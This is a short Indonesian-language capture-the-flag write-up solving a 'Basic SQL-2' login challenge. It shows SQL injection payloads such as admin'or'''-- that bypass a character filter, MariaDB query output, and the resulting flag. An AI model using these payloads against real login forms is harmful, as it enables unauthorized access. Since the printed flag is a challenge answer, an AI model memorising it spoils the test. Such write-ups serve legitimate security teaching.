<h1><b>Basic SQL-2</h1></b>
<pre>
Login form (username & password)
</pre>
</b><h3>Solution</h3></b>
<p>Pertama lakukan injection sederhana <b>'or''='</b> untuk username dan password</p>

```mysql
MariaDB [CTF]> select * from SQL_Challenge3 where username = ''or''='' and password=''or''='';
+----------+-------------------------+
| username | password                |
+----------+-------------------------+
| admin    | *********************** |
+----------+-------------------------+
1 row in set (0.000 sec)
```
<p>Jika kita lakukan diMySQL berhasil, Dan pada form terdapat error dengan pesan</p>
<pre align='center'>
Illegal Character Detected
</pre>
<p>Kemungkinan terdapat filter pada form yang tidak mengizinkan suatu character</p>
<p align='justify'>Selanjutnya kita coba injection <b>admin'or''#</b> yang kita anggap admin merupakan username bernilai 1(True) yang sesuai dengan database, tanda "#" merupakan 
sintak untuk membuat komentar diprogram php, yang intinya jika kita set "#" semua pemeriksaan sesudah tanda # akan diabaikan yang akan mengambil nilai dari username</p>

```mysql
MariaDB [CTF]> select * from SQL_Challenge3 where username = 'admin'or'''';
+----------+-------------------------+
| username | password                |
+----------+-------------------------+
| admin    | *********************** |
+----------+-------------------------+
1 row in set, 5 warnings (0.000 sec)
```
<p>Pada MySQL berhasil, Tetapi hasilnya masih error pada form seperti sebelumnya</p>
<pre align='center'>
Illegal Character Detected
</pre>
<p align='justify'>Selanjutnya mari kita coba dengan sintak komentar lainnya "--" menjadi <b>admin'or'''--</b>, dan ternyata berhasil tidak terdapat filter berupa character "--"</p>
<pre align='center'>
Your login success
Welcome admin, Flag VenomCTF{Its_5QL_Lv1_2}
</pre>
</b><h3>Flag</h3></b>
<pre>
VenomCTF{Its_5QL_Lv1_2}
</pre>
